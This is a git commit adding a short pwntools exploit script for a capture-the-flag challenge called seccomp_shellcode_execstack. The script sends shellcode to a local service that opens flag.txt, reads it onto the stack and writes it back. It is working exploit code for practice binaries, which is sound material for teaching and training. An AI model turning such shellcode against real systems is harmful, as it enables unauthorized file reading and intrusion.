805fb9ec800a343bf8ef8ac1e9fc3890d1fb235b
dmur1 <93072266+dmur1@users.noreply.github.com>
2025-03-24 21:34:35 +0000

    add seccomp_shellcode_execstack

---
+++ pwn/seccomp/seccomp_shellcode_execstack/challenge/go.py
@@ -0,0 +1,20 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+#context.log_level = "debug"
+elf = ELF("./task", checksec=False)
+context.binary = elf
+
+#p = elf.process()
+#p = elf.debug(gdbscript="")
+p = remote("127.0.0.1", 9001)
+
+payload = b""
+payload += asm(shellcraft.open("flag.txt"))
+payload += asm(shellcraft.read('rax', 'rsp', 64))
+payload += asm(shellcraft.write(1, 'rsp', 'rax'))
+p.sendline(payload)
+
+print(p.readuntil(b"}").decode())
+
